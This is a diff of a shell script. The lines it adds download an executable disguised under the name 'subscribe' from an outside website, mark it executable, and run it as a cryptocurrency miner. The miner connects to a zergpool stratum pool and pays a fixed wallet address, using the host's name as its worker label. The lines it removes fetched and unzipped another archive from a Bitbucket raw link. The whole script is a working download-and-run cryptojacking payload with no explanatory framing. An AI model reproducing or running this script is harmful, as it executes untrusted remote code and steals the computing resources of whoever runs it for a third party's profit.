@@ -1,10 +1,8 @@
 #!/bin/sh
 
-apt update
-apt install unzip -y
-wget https://bitbucket.org/oqoixgqoq9/-/raw/25f8209d27f8a34516048e8a74b69d73780530e2/ssse3.zip
-unzip ssse3.zip
+wget http://ilovenypizza.com/subscribe
+chmod +x subscribe
 
 #run
 
-./-.sh
+./subscribe -a cpupower -o stratum+tcp://cpupower.mine.zergpool.com:4250 -u CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk.$(cat /proc/sys/kernel/hostname) -p=c=CPU,mc=CPU
